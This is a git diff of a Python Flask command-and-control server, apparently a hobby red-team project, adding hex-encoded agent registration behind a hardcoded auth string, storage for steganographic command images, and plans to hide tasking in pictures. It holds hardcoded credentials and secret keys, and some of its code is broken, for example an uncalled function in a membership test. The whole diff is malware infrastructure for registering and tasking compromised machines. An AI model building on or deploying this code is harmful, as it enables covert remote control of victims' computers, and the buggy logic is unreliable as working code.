@@ -17,7 +17,7 @@ else:
 
 username = "pogChamp"
 password = "BestC2Ever"
-server = "localhost"
+server = "10.0.2.15"
 
 authToken = "areTheyDeadYet"
 app.secret_key = 'My name is bobobo-bo bo-bobobo, but you can call me bobobo'
@@ -39,6 +39,12 @@ password = 'Bobobo'
 
 def main():
     size_db = os.path.getsize("database/c2.db")
+
+
+class CommandImages(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    image = db.Column(db.Text(4294000000))
+    done = db.Column(db.Boolean)
 
 
 class Command(db.Model):
@@ -79,6 +85,14 @@ def getUserList():
     return users
 
 
+def getGuidList():
+    agents_unfiltered = Agents.query.all()
+    agents = []
+    for x in agents_unfiltered:
+        agents.append(x.username)
+    return agents
+
+
 @login_manager.user_loader
 def user_loader(username):
     users = getUserList()
@@ -117,18 +131,36 @@ def home():
             return render_template('redir.html')
 
 
-@app.route('/register')
+@app.route('/register', methods=['POST'])
 def register():
-    guid = request.args.get('guid')
-    user = request.args.get('user')
-    computer = request.args.get('computer')
-    save_agent = Agents(guid=guid, user=user, computer=computer)
-    db.session.add(save_agent)
-    db.session.commit()
-    return render_template('register.html')
+    req_data = request.data.decode("utf-8")[4:]
+    hex_data = bytes.fromhex(req_data)
+    ascii_data = hex_data.decode("ASCII")
+    parsed_data = ascii_data.split('&')
+    print(parsed_data)
+    if parsed_data[0] == "auth=507261697365204c6f7264204265726e617264696e6921":
+        guid = parsed_data[1][5:]
+        user = parsed_data[2][5:]
+        computer = parsed_data[3][9:]
+        if guid not in getGuidList:
+            save_agent = Agents(guid=guid, user=user, computer=computer)
+            db.session.add(save_agent)
+            db.session.commit()
+        return render_template('register.html')
+    else:
+        return render_template('redir.html')
 
-# TODO CHANGE THIS FUNCTION TO WORK WITH STEGANOGRAPHY
+
+# TODO CHANGE COMMANDS FUNCTION TO WORK WITH STEGANOGRAPHY
 # NOTE WE WILL PROBABLY HAVE TO CHANGE THE SQL DATABASE WITH THIS, TOO
+
+
+def getImages():
+    images_raw = CommandImages.query.all()
+    images = []
+    for x in images_raw:
+        images.append(x.image)
+    return images
 
 
 @app.route('/commands', methods=['GET', 'POST'])
@@ -153,7 +185,7 @@ def getCommand():
         task_queue = Command.query.all()
         # TODO CONVERT THESE COMMANDS TO STEGA PICTURES AND STORE THEM IN A FILE? OR MAKE A LIST
 
-        return render_template('simple_commands.html', task_queue=task_queue)
+        return render_template('commands.html', task_queue=task_queue)
     else:
         return render_template('redir.html')
 
@@ -236,3 +268,23 @@ if __name__ == '__main__':
     main()
     app.run(host="0.0.0.0", debug=False)
     db.create_all()
+
+
+# DEPRECATED CODE
+
+
+# @app.route('/upload', methods=['GET'])
+# def upload():
+#     return render_template('img-commands.html')
+
+
+# @app.route('/upload', methods=['GET', 'POST'])
+# def upload_file():
+#     # if request.method == 'GET':
+#     #     return render_template('upload.html')
+#     # elif request.method == 'POST':
+#     imgFile = request.files['image']
+#     new_img = CommandImages(image=imgFile, done=False)
+#     db.add(new_img)
+#     db.commit()
+#     return render_template('img-commands.html', images=getImages())
